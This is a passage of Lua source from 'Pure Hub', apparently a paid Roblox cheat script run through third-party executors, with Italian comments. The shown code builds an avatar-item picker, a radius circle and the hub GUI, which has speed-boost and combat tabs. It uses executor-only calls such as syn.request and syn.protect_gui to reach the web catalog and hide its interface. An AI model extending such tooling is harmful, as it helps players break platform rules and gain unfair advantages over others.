          if _acPickerJustClosedCat == catName and (tick() - _acPickerJustClosedAt) < 0.25 then
            _acPickerJustClosedCat = nil
            return
          end
          _acClosePicker()
          _acPickerJustClosedCat = nil
          _acPickerCat = catName

          _acPickerGui=Instance.new("ScreenGui")
          _acPickerGui.Name="AmbitiousHubAVChanger"
          _acPickerGui.ResetOnSpawn=false
          _acPickerGui.IgnoreGuiInset=true
          _acPickerGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
          _acPickerGui.DisplayOrder=9998
          _acPickerGui.Parent=HubGui

          -- Frame (non TextButton) come tutti gli altri picker: un TextButton
          -- catturerebbe l'input e i bottoni sotto smetterebbero di ricevere
          -- MouseLeave, restando bloccati nello stato hover.
          local backdrop=Instance.new("Frame")
          backdrop.Name="Backdrop"
          backdrop.Size=UDim2.new(1,0,1,0)
          backdrop.BackgroundColor3=Color3.fromRGB(0,0,0)
          backdrop.BackgroundTransparency=0.45
          backdrop.BorderSizePixel=0
          backdrop.ZIndex=1
          backdrop.Parent=_acPickerGui

          local pickerFrame=Instance.new("Frame")
          pickerFrame.Name="Frame"
          pickerFrame.Size=UDim2.new(0,370,0,510)
          pickerFrame.Position=UDim2.new(0.5,-185,0.5,-255)
          pickerFrame.BackgroundColor3=Color3.fromRGB(8,8,10)
          pickerFrame.BorderSizePixel=0
          pickerFrame.ZIndex=2
          pickerFrame.Parent=_acPickerGui
          corner(pickerFrame,16)
          stroke(pickerFrame,Color3.fromRGB(90,90,105),1.2,0.3)

          -- Title bar
          local titleBar=Instance.new("Frame")
          titleBar.Size=UDim2.new(1,0,0,48)
          titleBar.BackgroundColor3=Color3.fromRGB(12,12,15)
          titleBar.BackgroundTransparency=0.15
          titleBar.BorderSizePixel=0
          titleBar.ZIndex=3
          titleBar.Parent=pickerFrame
          corner(titleBar,16)

          local titleLabel=Instance.new("TextLabel")
          titleLabel.Size=UDim2.new(1,-60,1,0)
          titleLabel.Position=UDim2.new(0,18,0,0)
          titleLabel.BackgroundTransparency=1
          titleLabel.Text=catName.." Changer"
          titleLabel.TextColor3=Color3.fromRGB(255,255,255)
          titleLabel.Font=Enum.Font.GothamBlack
          titleLabel.TextSize=15
          titleLabel.TextXAlignment=Enum.TextXAlignment.Left
          titleLabel.ZIndex=4
          titleLabel.Parent=titleBar

          local closeBtn=Instance.new("TextButton")
          closeBtn.Size=UDim2.new(0,36,0,36)
          closeBtn.Position=UDim2.new(1,-44,0,6)
          closeBtn.BackgroundColor3=Color3.fromRGB(25,25,28)
          closeBtn.BackgroundTransparency=0.1
          closeBtn.BorderSizePixel=0
          closeBtn.Text="X"
          closeBtn.TextColor3=Color3.fromRGB(255,255,255)
          closeBtn.Font=Enum.Font.GothamBlack
          closeBtn.TextSize=14
          closeBtn.AutoButtonColor=false
          closeBtn.ZIndex=4
          closeBtn.Parent=titleBar
          corner(closeBtn,10)
          stroke(closeBtn,Color3.fromRGB(90,90,105),1,0.4)
          closeBtn.MouseEnter:Connect(function() tween(closeBtn,{BackgroundColor3=Color3.fromRGB(180,50,50)},0.12) end)
          closeBtn.MouseLeave:Connect(function() tween(closeBtn,{BackgroundColor3=Color3.fromRGB(25,25,28)},0.12) end)
          closeBtn.Activated:Connect(_acClosePicker)

          -- Search bar
          local searchBar=Instance.new("TextBox")
          searchBar.Size=UDim2.new(1,-24,0,30)
          searchBar.Position=UDim2.new(0,12,0,55)
          searchBar.BackgroundColor3=Color3.fromRGB(18,18,22)
          searchBar.BackgroundTransparency=0.1
          searchBar.BorderSizePixel=0
          searchBar.PlaceholderText="Search name, or paste an asset ID..."
          searchBar.PlaceholderColor3=Color3.fromRGB(110,110,120)
          searchBar.Text=""
          searchBar.TextColor3=Color3.fromRGB(245,245,255)
          searchBar.Font=Enum.Font.GothamSemibold
          searchBar.TextSize=12
          searchBar.ClearTextOnFocus=false
          searchBar.ZIndex=4
          searchBar.Parent=pickerFrame
          corner(searchBar,8)
          stroke(searchBar,Color3.fromRGB(70,70,85),1,0.4)

          -- Status label
          local statusLabel=Instance.new("TextLabel")
          statusLabel.Size=UDim2.new(1,-24,0,22)
          statusLabel.Position=UDim2.new(0,12,0,92)
          statusLabel.BackgroundTransparency=1
          statusLabel.Text="Loading..."
          statusLabel.TextColor3=Color3.fromRGB(150,150,160)
          statusLabel.Font=Enum.Font.GothamSemibold
          statusLabel.TextSize=11
          statusLabel.ZIndex=4
          statusLabel.Parent=pickerFrame

          -- Scroll con thumbnails a griglia
          local scrollFrame=Instance.new("ScrollingFrame")
          scrollFrame.Size=UDim2.new(1,-12,1,-100)
          scrollFrame.Position=UDim2.new(0,6,0,96)
          scrollFrame.BackgroundTransparency=1
          scrollFrame.BorderSizePixel=0
          scrollFrame.ScrollBarThickness=4
          scrollFrame.ScrollBarImageColor3=Color3.fromRGB(80,80,90)
          scrollFrame.CanvasSize=UDim2.new(0,0,0,0)
          scrollFrame.AutomaticCanvasSize=Enum.AutomaticSize.Y
          scrollFrame.ZIndex=3
          scrollFrame.Parent=pickerFrame

          local gridLayout=Instance.new("UIGridLayout")
          gridLayout.CellSize=UDim2.new(0,100,0,120)
          gridLayout.CellPadding=UDim2.new(0,8,0,8)
          gridLayout.FillDirection=Enum.FillDirection.Horizontal
          gridLayout.HorizontalAlignment=Enum.HorizontalAlignment.Center
          gridLayout.SortOrder=Enum.SortOrder.LayoutOrder
          gridLayout.Parent=scrollFrame

          local gridPad=Instance.new("UIPadding")
          gridPad.PaddingTop=UDim.new(0,8)
          gridPad.PaddingBottom=UDim.new(0,8)
          gridPad.PaddingLeft=UDim.new(0,6)
          gridPad.PaddingRight=UDim.new(0,6)
          gridPad.Parent=scrollFrame

          local itemOrder=0
          local currentCatalogPage=nil
          local loadingMore=false

          local function makeItemCard(item)
            itemOrder=itemOrder+1
            local card=Instance.new("TextButton")
            card.Name="AC_Item_"..tostring(item.Id)
            card.BackgroundColor3=Color3.fromRGB(16,16,20)
            card.BackgroundTransparency=0.05
            card.BorderSizePixel=0
            card.Text=""
            card.AutoButtonColor=false
            card.LayoutOrder=itemOrder
            card.ZIndex=4
            card.Parent=scrollFrame
            corner(card,10)
            local cardStroke=Instance.new("UIStroke")
            cardStroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
            cardStroke.Color=Color3.fromRGB(50,50,62)
            cardStroke.Thickness=1
            cardStroke.Transparency=0.5
            cardStroke.Parent=card

            -- Thumbnail immagine
            local thumb=Instance.new("ImageLabel")
            thumb.Size=UDim2.new(1,-8,0,72)
            thumb.Position=UDim2.new(0,4,0,4)
            thumb.BackgroundColor3=Color3.fromRGB(22,22,28)
            thumb.BorderSizePixel=0
            thumb.ZIndex=5
            thumb.Image="rbxthumb://type=Asset&id="..tostring(item.Id).."&w=150&h=150"
            thumb.ScaleType=Enum.ScaleType.Fit
            thumb.Parent=card
            corner(thumb,7)

            -- Nome item (sotto thumbnail, troncato)
            local nameLabel=Instance.new("TextLabel")
            nameLabel.Size=UDim2.new(1,-6,0,30)
            nameLabel.Position=UDim2.new(0,3,0,78)
            nameLabel.BackgroundTransparency=1
            nameLabel.Text=item.Name or "?"
            nameLabel.TextColor3=Color3.fromRGB(225,225,235)
            nameLabel.Font=Enum.Font.GothamSemibold
            nameLabel.TextSize=9
            nameLabel.TextWrapped=true
            nameLabel.TextXAlignment=Enum.TextXAlignment.Center
            nameLabel.TextYAlignment=Enum.TextYAlignment.Top
            nameLabel.ZIndex=5
            nameLabel.Parent=card

            card.MouseEnter:Connect(function()
              tween(card,{BackgroundColor3=Color3.fromRGB(30,30,38)},0.1)
              tween(cardStroke,{Color=Color3.fromRGB(200,200,210),Transparency=0.15},0.1)
            end)
            card.MouseLeave:Connect(function()
              -- ripristina colore normale (verde=selezionato gia' equipaggiato)
              local entry=_G._AmbitiousAvatarChanger[catName]
              local isSaved = entry and entry.savedId == item.Id
              tween(card,{BackgroundColor3=isSaved and Color3.fromRGB(20,36,20) or Color3.fromRGB(16,16,20)},0.1)
              tween(cardStroke,{Color=isSaved and Color3.fromRGB(120,220,120) or Color3.fromRGB(50,50,62),Transparency=isSaved and 0.15 or 0.5},0.1)
            end)

            -- Evidenzia se gia' salvato
            local entry=_G._AmbitiousAvatarChanger[catName]
            if entry and entry.savedId == item.Id then
              card.BackgroundColor3=Color3.fromRGB(20,36,20)
              cardStroke.Color=Color3.fromRGB(120,220,120)
              cardStroke.Transparency=0.15
            end

            card.Activated:Connect(function()
              local ent=_G._AmbitiousAvatarChanger[catName]
              if not ent then return end
              -- Se toggle ON e c'era un vecchio item, rimuovilo prima
              if ent.enabled and ent.savedId and ent.savedName ~= "" then
                _acRemoveItem(assetTypes[1], ent.savedName)
              end
              ent.savedId=item.Id
              ent.savedName=item.Name or ""
              if ent.enabled then
                local _id, _at, _nm = item.Id, assetTypes[1], item.Name or ""
                task.spawn(function() _acEquipItem(_id,_at,_nm) end)
              end
              _acSaveConfig()
              -- Aggiorna highlight su tutte le card
              for _,ch in ipairs(scrollFrame:GetChildren()) do
                if ch:IsA("TextButton") then
                  local st2=ch:FindFirstChildOfClass("UIStroke")
                  local isThis=(ch.Name=="AC_Item_"..tostring(item.Id))
                  tween(ch,{BackgroundColor3=isThis and Color3.fromRGB(20,36,20) or Color3.fromRGB(16,16,20)},0.14)
                  if st2 then tween(st2,{Color=isThis and Color3.fromRGB(120,220,120) or Color3.fromRGB(50,50,62),Transparency=isThis and 0.15 or 0.5},0.14) end
                end
              end
            end)
          end

          -- Numero della categoria per l'API web di Roblox. Serve al fallback
          -- HTTP: AvatarEditorService:SearchCatalog richiede il permesso del
          -- giocatore e su molti executor fallisce in silenzio, lasciando la
          -- griglia vuota (era il motivo per cui non si poteva scegliere nulla).
          local AC_WEB_TYPE = {
            [Enum.AvatarAssetType.HairAccessory]     = 41,
            [Enum.AvatarAssetType.Hat]               = 8,
            [Enum.AvatarAssetType.FaceAccessory]     = 42,
            [Enum.AvatarAssetType.NeckAccessory]     = 43,
            [Enum.AvatarAssetType.ShoulderAccessory] = 44,
            [Enum.AvatarAssetType.FrontAccessory]    = 45,
            [Enum.AvatarAssetType.BackAccessory]     = 46,
            [Enum.AvatarAssetType.WaistAccessory]    = 47,
            [Enum.AvatarAssetType.Shirt]             = 11,
            [Enum.AvatarAssetType.Pants]             = 12,
            [Enum.AvatarAssetType.TShirt]            = 2,
            [Enum.AvatarAssetType.JacketAccessory]   = 65,
            [Enum.AvatarAssetType.SweaterAccessory]  = 64,
            [Enum.AvatarAssetType.ShortsAccessory]   = 66,
          }

          -- Ricerca via HTTP sul catalogo pubblico. Ritorna una lista di
          -- {Id=, Name=} oppure nil se l'executor non espone una request.
          local function webSearch(keyword)
            local req = (syn and syn.request) or (http and http.request)
                        or http_request or request
            if not req then return nil end
            local webType = AC_WEB_TYPE[assetTypes[1]]
            if not webType then return nil end
            local url = "https://catalog.roblox.com/v1/search/items/details?Category=11"
                     .. "&AssetTypeId=" .. tostring(webType)
                     .. "&Limit=30&SortType=0"
            if keyword and keyword ~= "" then
              url = url .. "&Keyword=" .. (game:GetService("HttpService"):UrlEncode(keyword))
            end
            local ok, res = pcall(req, { Url = url, Method = "GET" })
            if not ok or not res or not res.Body then return nil end
            local ok2, decoded = pcall(function()
              return game:GetService("HttpService"):JSONDecode(res.Body)
            end)
            if not ok2 or type(decoded) ~= "table" or type(decoded.data) ~= "table" then
              return nil
            end
            local out = {}
            for _, d in ipairs(decoded.data) do
              if d.id then
                table.insert(out, { Id = d.id, Name = d.name or ("Asset " .. tostring(d.id)) })
              end
            end
            return out
          end

          local function loadItems(keyword)
            for _,c in ipairs(scrollFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
            itemOrder=0
            currentCatalogPage=nil
            loadingMore=false
            statusLabel.Text="Loading..."
            statusLabel.Visible=true

            -- Se la ricerca e' solo cifre la si tratta come un ID diretto:
            -- funziona sempre, anche senza catalogo e senza HTTP.
            local asId = keyword and tonumber(keyword:match("^%s*(%d+)%s*$"))
            if asId then
              statusLabel.Visible=false
              makeItemCard({ Id = asId, Name = "Asset " .. tostring(asId) })
              return
            end

            task.spawn(function()
              local ok,pages2=pcall(function()
                local params=CatalogSearchParams.new()
                params.AssetTypes=assetTypes
                if keyword and keyword~="" then params.SearchKeyword=keyword end
                return game:GetService("AvatarEditorService"):SearchCatalog(params)
              end)

              if ok and pages2 then
                local okPage, firstPage = pcall(function() return pages2:GetCurrentPage() end)
                if okPage and type(firstPage) == "table" and #firstPage > 0 then
                  currentCatalogPage=pages2
                  statusLabel.Visible=false
                  statusLabel.Text=""
                  for _,item in ipairs(firstPage) do makeItemCard(item) end
                  return
                end
              end

              -- Fallback HTTP
              local webItems = webSearch(keyword)
              if webItems and #webItems > 0 then
                currentCatalogPage=nil   -- niente paginazione infinita qui
                statusLabel.Visible=false
                statusLabel.Text=""
                for _,item in ipairs(webItems) do makeItemCard(item) end
                return
              end

              statusLabel.Visible=true
              statusLabel.Text="No catalog access — type an asset ID in the search bar."
            end)
          end

          scrollFrame:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
            if loadingMore or not currentCatalogPage then return end
            local posY=scrollFrame.CanvasPosition.Y
            local canvasH=scrollFrame.CanvasSize.Y.Offset
            local viewH=scrollFrame.AbsoluteSize.Y
            if canvasH>0 and posY+viewH>=canvasH-100 and not currentCatalogPage.IsFinished then
              loadingMore=true
              task.spawn(function()
                local ok2=pcall(function() currentCatalogPage:AdvanceToNextPageAsync() end)
                if ok2 then
                  for _,item in ipairs(currentCatalogPage:GetCurrentPage()) do makeItemCard(item) end
                end
                loadingMore=false
              end)
            end
          end)

          local searchDebounce=nil
          searchBar:GetPropertyChangedSignal("Text"):Connect(function()
            if searchDebounce then task.cancel(searchDebounce) end
            searchDebounce=task.delay(0.5,function() loadItems(searchBar.Text) end)
          end)

          backdrop.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
              _acClosePicker()
            end
          end)

          pickerFrame.Size=UDim2.new(0,0,0,0)
          pickerFrame.Position=UDim2.new(0.5,0,0.5,0)
          TweenService:Create(pickerFrame,TweenInfo.new(0.3,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{
            Size=UDim2.new(0,370,0,510),
            Position=UDim2.new(0.5,-185,0.5,-255)
          }):Play()

          loadItems("")
        end

        -- Ponte verso la GUI di Pure Hub
        _G.PureAvatarChanger = {
            categories = AC_CATEGORIES,
            state      = _G._AmbitiousAvatarChanger,
            openPicker = _acOpenPicker,
            removeItem = _acRemoveItem,
            equipItem  = _acEquipItem,
            applyAll   = function() task.spawn(function() _acApplyAll() end) end,
        }
    end

    -- ========================== RADIUS CIRCLE ==========================
    -- Disco piatto alla base dei piedi, raggio e colore regolabili.
    do
        _G.PureRadiusCircleEnabled = _G.PureRadiusCircleEnabled == true
        _G.PureRadiusCircleRadius  = tonumber(_G.PureRadiusCircleRadius) or 8
        _G.PureRadiusCircleColor   = _G.PureRadiusCircleColor or Color3.fromRGB(201, 238, 255)

        local rcPart, rcConn

        local function rcDestroy()
            if rcConn then pcall(function() rcConn:Disconnect() end); rcConn = nil end
            if rcPart then pcall(function() rcPart:Destroy() end); rcPart = nil end
        end

        local function rcEnsure()
            if rcPart and rcPart.Parent then return rcPart end
            local cam = workspace.CurrentCamera
            if not cam then return nil end
            for _, o in ipairs(cam:GetChildren()) do
                if o.Name == "PureRadiusCircle" or o.Name == "BloomRadiusCircle" then pcall(function() o:Destroy() end) end
            end
            local p = Instance.new("Part")
            p.Name        = "PureRadiusCircle"
            p.Shape       = Enum.PartType.Cylinder
            p.Anchored    = true
            p.CanCollide  = false
            p.CanQuery    = false
            p.CanTouch    = false
            p.CastShadow  = false
            p.Massless    = true
            p.Material    = Enum.Material.Neon
            p.Color       = _G.PureRadiusCircleColor
            p.Transparency = 0.72
            p.Size        = Vector3.new(0.12, 2, 2)
            p.Parent      = cam
            rcPart = p
            return p
        end

        local function rcStep()
            if _G.PureRadiusCircleEnabled ~= true then rcDestroy() return end
            local char = LP.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if not hrp then if rcPart then rcPart.Transparency = 1 end return end
            local p = rcEnsure(); if not p then return end
            p.Transparency = 0.72
            local d = math.clamp(tonumber(_G.PureRadiusCircleRadius) or 8, 0.5, 500) * 2
            p.Size = Vector3.new(0.12, d, d)
            local footY = hrp.Position.Y - (hrp.Size.Y * 0.5) - ((hum and hum.HipHeight) or 2)
            local prev = _G._PureRCLastY
            if prev and math.abs(footY - prev) < 1.5 then
                footY = prev + (footY - prev) * 0.4
            end
            _G._PureRCLastY = footY
            p.CFrame = CFrame.new(hrp.Position.X, footY + 0.2, hrp.Position.Z)
                     * CFrame.Angles(0, 0, math.rad(90))
        end

        function _G.PureSetRadiusCircle(on)
            _G.PureRadiusCircleEnabled = on and true or false
            if _G.PureRadiusCircleEnabled then
                if not rcConn then
                    rcConn = RunService.RenderStepped:Connect(function()
                        local ok = pcall(rcStep)
                        if not ok and rcPart then rcPart.Transparency = 1 end
                    end)
                end
            else
                rcDestroy()
            end
        end

        function _G.PureSetRadiusCircleColor(c)
            if typeof(c) ~= "Color3" then return end
            _G.PureRadiusCircleColor = c
            if rcPart and rcPart.Parent then pcall(function() rcPart.Color = c end) end
        end

        function _G.PureSetRadiusCircleRadius(v)
            v = tonumber(v); if not v then return end
            _G.PureRadiusCircleRadius = math.clamp(v, 0.5, 500)
        end
    end
end
-- ################## END AMBITIOUS -> PURE HUB PORT ##################

local function buildGui()
    local WHITE      = Color3.fromRGB(240, 246, 255)
    local BLACK      = Color3.fromRGB(6, 18, 36)
    local DARK       = Color3.fromRGB(3, 7, 15)
    local DARKER     = Color3.fromRGB(2, 5, 11)
    local MID        = Color3.fromRGB(12, 28, 52)
    local DIM_LINE   = Color3.fromRGB(52, 112, 185)
    local CHECK_OFF  = Color3.fromRGB(10, 24, 48)
    local BTN_ACT    = Color3.fromRGB(10, 32, 68)
    local INP_BG     = Color3.fromRGB(7, 15, 28)
    local CYAN_SECT  = Color3.fromRGB(84, 170, 248)
    local BLUE_GLOW  = Color3.fromRGB(56, 148, 250)
    local PILL_ON    = Color3.fromRGB(34, 122, 238)
    local ROW_W      = 0.64

    __HH.TOGGLE_ON_COLOR = PILL_ON

    for _, name in ipairs({"Pure Hub", "Bloom Hub", "Horizon Hub", "Pure hub", "HorizonHubMobileButtons", "PureHubMobileButtons", "yousefStealBar", "yousefRagdollTimer"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(name)
        if old then old:Destroy() end
        local pg = LP:FindFirstChild("PlayerGui")
        if pg then local o = pg:FindFirstChild(name); if o then o:Destroy() end end
    end

    if _G.setupNexusGrabBar then pcall(_G.setupNexusGrabBar) end
    local gui = Instance.new("ScreenGui")
    gui.Name = "Pure Hub"; gui.ResetOnSpawn = false
    gui.DisplayOrder = 10; gui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
        gui.Parent = LP:WaitForChild("PlayerGui")
    end

    __HH.uiScaleObject = Instance.new("UIScale", gui)
    __HH.uiScaleObject.Scale = uiScaleValue

    __HH.mainFrame = Instance.new("Frame", gui)
    __HH.mainFrame.Name = "MainFrame"
    __HH.mainFrame.Size = UDim2.new(0, 560, 0, 500)
    __HH.mainFrame.Position = UDim2.new(0.5, -280, 0.5, -268)
    __HH.mainFrame.BackgroundColor3 = DARK
    __HH.mainFrame.BorderSizePixel = 0
    __HH.mainFrame.ClipsDescendants = true
    Instance.new("UICorner", __HH.mainFrame).CornerRadius = UDim.new(0, 16)

    local mainStroke = Instance.new("UIStroke", __HH.mainFrame)
    mainStroke.Color = Color3.fromRGB(56, 128, 218)
    mainStroke.Thickness = 1.4
    mainStroke.Transparency = 0.22

    __HH.bgImage = Instance.new("ImageLabel", __HH.mainFrame)
    __HH.bgImage.Size = UDim2.new(1, 0, 1, 0); __HH.bgImage.Position = UDim2.new(0, 0, 0, 0)
    __HH.bgImage.BackgroundTransparency = 1
    __HH.bgImage.Image = "rbxassetid://79302556024569"
    __HH.bgImage.ScaleType = Enum.ScaleType.Crop; __HH.bgImage.ZIndex = 1
    __HH.bgImage.ImageTransparency = 0
    Instance.new("UICorner", __HH.bgImage).CornerRadius = UDim.new(0, 16)

    task.spawn(function()
        local customBg = _G.loadPureCustomAsset("pure_hub_planet_bg_v2.jpg", "https://pomf2.lain.la/f/cozs8qmi.jpg", "")
        if customBg ~= "" and __HH.bgImage and __HH.bgImage.Parent then
            __HH.bgImage.Image = customBg
        end
    end)

    local bgOverlay = Instance.new("Frame", __HH.mainFrame)
    bgOverlay.Size = UDim2.new(1, 0, 1, 0); bgOverlay.BackgroundColor3 = DARK
    bgOverlay.BackgroundTransparency = 1
    bgOverlay.BorderSizePixel = 0; bgOverlay.ZIndex = 2
    Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0, 16)

    local dragging, dragInput2, dragStart2, startPos2
    __HH.mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart2 = input.Position
            startPos2 = __HH.mainFrame.Position
            dragInput2 = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    dragInput2 = nil
                end
            end)
        end
    end)
    __HH.mainFrame.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - dragStart2
            if delta.Magnitude > 5 then
                __HH.mainFrame.Position = UDim2.new(
                    startPos2.X.Scale,
                    startPos2.X.Offset + delta.X,
                    startPos2.Y.Scale,
                    startPos2.Y.Offset + delta.Y
                )
            end
        end
    end)

    local Header = Instance.new("Frame", __HH.mainFrame)
    Header.Name = "Header"; Header.Size = UDim2.new(1, 0, 0, 52)
    Header.BackgroundTransparency = 1; Header.ZIndex = 3

    local Title = Instance.new("TextLabel", Header)
    Title.Size = UDim2.new(0, 220, 0, 38); Title.Position = UDim2.new(0, 22, 0, 10)
    Title.BackgroundTransparency = 1; Title.Text = "Pure Hub"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 26; Title.TextXAlignment = Enum.TextXAlignment.Left; Title.ZIndex = 4
    local titleGrad = Instance.new("UIGradient", Title)
    titleGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(218, 232, 250)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(142, 174, 218))
    })
    titleGrad.Rotation = 90

    local closeBtn = Instance.new("TextButton", Header)
    closeBtn.Size = UDim2.new(0, 24, 0, 24); closeBtn.Position = UDim2.new(1, -40, 0, 14)
    closeBtn.BackgroundColor3 = Color3.fromRGB(8, 20, 42); closeBtn.BackgroundTransparency = 0.25
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "-"; closeBtn.TextColor3 = Color3.fromRGB(190, 220, 255)
    closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 18; closeBtn.ZIndex = 6
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
    local closeBtnStroke = Instance.new("UIStroke", closeBtn)
    closeBtnStroke.Color = Color3.fromRGB(58, 132, 220); closeBtnStroke.Thickness = 1; closeBtnStroke.Transparency = 0.3

    local miniToggleBtn = Instance.new("TextButton", gui)
    miniToggleBtn.Name = "MiniToggle"
    miniToggleBtn.Size = UDim2.new(0, 140, 0, 34)
    miniToggleBtn.AnchorPoint = Vector2.new(0.5, 0)
    miniToggleBtn.Position = UDim2.new(0.5, 0, 0, 12)
    miniToggleBtn.BackgroundColor3 = Color3.fromRGB(8, 20, 42)
    miniToggleBtn.Text = "Pure Hub"
    miniToggleBtn.TextColor3 = WHITE
    miniToggleBtn.Font = Enum.Font.GothamBlack
    miniToggleBtn.TextSize = 15
    miniToggleBtn.BorderSizePixel = 0
    miniToggleBtn.ZIndex = 100
    miniToggleBtn.Visible = false
    Instance.new("UICorner", miniToggleBtn).CornerRadius = UDim.new(0, 10)
    local miniStroke = Instance.new("UIStroke", miniToggleBtn)
    miniStroke.Color = BLUE_GLOW; miniStroke.Thickness = 1.6

    miniToggleBtn.MouseButton1Click:Connect(function()
        __HH.mainFrame.Visible = true
        miniToggleBtn.Visible = false
    end)

    local miniDrag, miniDragStart, miniStartPos
    miniToggleBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            miniDrag = true
            miniDragStart = input.Position
            miniStartPos = miniToggleBtn.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then miniDrag = false end
            end)
        end
    end)
    __HH.UIS.InputChanged:Connect(function(input)
        if miniDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - miniDragStart
            miniToggleBtn.Position = UDim2.new(miniStartPos.X.Scale, miniStartPos.X.Offset + delta.X, miniStartPos.Y.Scale, miniStartPos.Y.Offset + delta.Y)
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        __HH.mainFrame.Visible = false
        miniToggleBtn.Visible = true
    end)

    local Sidebar = Instance.new("Frame", __HH.mainFrame)
    Sidebar.Name = "Sidebar"; Sidebar.Size = UDim2.new(1, -36, 0, 36)
    Sidebar.Position = UDim2.new(0, 18, 0, 52); Sidebar.BackgroundTransparency = 1; Sidebar.ZIndex = 4

    local SidebarLine = Instance.new("Frame", Sidebar)
    SidebarLine.Size = UDim2.new(1, 0, 0, 1); SidebarLine.Position = UDim2.new(0, 0, 1, 0)
    SidebarLine.BackgroundColor3 = Color3.fromRGB(45, 98, 165); SidebarLine.BackgroundTransparency = 0.52
    SidebarLine.BorderSizePixel = 0; SidebarLine.ZIndex = 3

    local TabContainer = Instance.new("Frame", Sidebar)
    TabContainer.Size = UDim2.new(1, -128, 1, 0); TabContainer.Position = UDim2.new(0, 0, 0, 0)
    TabContainer.BackgroundTransparency = 1; TabContainer.ZIndex = 10
    local TabListLayout = Instance.new("UIListLayout", TabContainer)
    TabListLayout.FillDirection = Enum.FillDirection.Horizontal; TabListLayout.Padding = UDim.new(0, 2); TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder

    local buyerLabel = Instance.new("TextLabel", Sidebar)
    buyerLabel.Name = "HorizonHubBuyer"; buyerLabel.Size = UDim2.new(0, 118, 0, 28); buyerLabel.Position = UDim2.new(1, -118, 0.5, -14)
    buyerLabel.BackgroundColor3 = Color3.fromRGB(7, 15, 28); buyerLabel.BackgroundTransparency = 0.14; buyerLabel.BorderSizePixel = 0
    buyerLabel.Text = "PURE HUB BUYER"; buyerLabel.TextColor3 = Color3.fromRGB(98, 180, 252); buyerLabel.Font = Enum.Font.GothamBold; buyerLabel.TextSize = 9; buyerLabel.TextTransparency = 0; buyerLabel.ZIndex = 12
    Instance.new("UICorner", buyerLabel).CornerRadius = UDim.new(0, 8)
    local buyerStroke = Instance.new("UIStroke", buyerLabel); buyerStroke.Color = Color3.fromRGB(52, 118, 205); buyerStroke.Thickness = 1.2; buyerStroke.Transparency = 0.22

    local ContentContainer = Instance.new("Frame", __HH.mainFrame)
    ContentContainer.Size = UDim2.new(1, -32, 1, -112); ContentContainer.Position = UDim2.new(0, 16, 0, 96)
    ContentContainer.BackgroundColor3 = Color3.fromRGB(4, 10, 20)
    ContentContainer.BackgroundTransparency = 0.78
    ContentContainer.BorderSizePixel = 0
    ContentContainer.ZIndex = 3
    Instance.new("UICorner", ContentContainer).CornerRadius = UDim.new(0, 14)

    local innerStroke = Instance.new("UIStroke", ContentContainer)
    innerStroke.Color = Color3.fromRGB(58, 142, 242)
    innerStroke.Thickness = 1.3
    innerStroke.Transparency = 0.18

    local currentTab = nil
    local TabRefs = {contents = {}, btns = {}, underlines = {}, active = "Speed"}
    local TabList = {"Speed","Combat","Mechns","Visual","Extra","Mobile"}

    for i, name in ipairs(TabList) do
        local wrapper = Instance.new("Frame", TabContainer)
        wrapper.Size = UDim2.new(1/6, -3, 0, 30)
        wrapper.BackgroundTransparency = 1
        wrapper.LayoutOrder = i

        local btn = Instance.new("TextButton", wrapper)
        btn.Size = UDim2.new(1, 0, 0, 30)
        btn.BackgroundTransparency = 1
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        local tabDisplay = {Speed="Speed Boost", Combat="Important", Mechns="Key Bind", Visual="Visual", Extra="Settings", Mobile="Mobile"}
        btn.Text = tabDisplay[name] or name
        btn.TextColor3 = (i == 1) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(196, 212, 232)
        btn.TextTransparency = 0
        btn.Font = Enum.Font.GothamSemibold
        btn.TextSize = 10
        btn.TextXAlignment = Enum.TextXAlignment.Center
        btn.ZIndex = 12
        __HH.setIceSectionActive(btn, i == 1)

        TabRefs.btns[name] = btn

        local page = Instance.new("ScrollingFrame", ContentContainer)
        page.Size = UDim2.new(1, 0, 1, 0)
        page.BackgroundTransparency = 1
        page.BorderSizePixel = 0
        page.CanvasSize = UDim2.new(0, 0, 0, 0)
        page.AutomaticCanvasSize = Enum.AutomaticSize.Y
        page.ScrollBarThickness = 2
        page.ScrollBarImageColor3 = BLUE_GLOW
        page.Visible = (i == 1)
        page.ZIndex = 4
        local pageLayout = Instance.new("UIListLayout", page)
        pageLayout.Padding = UDim.new(0, 6)
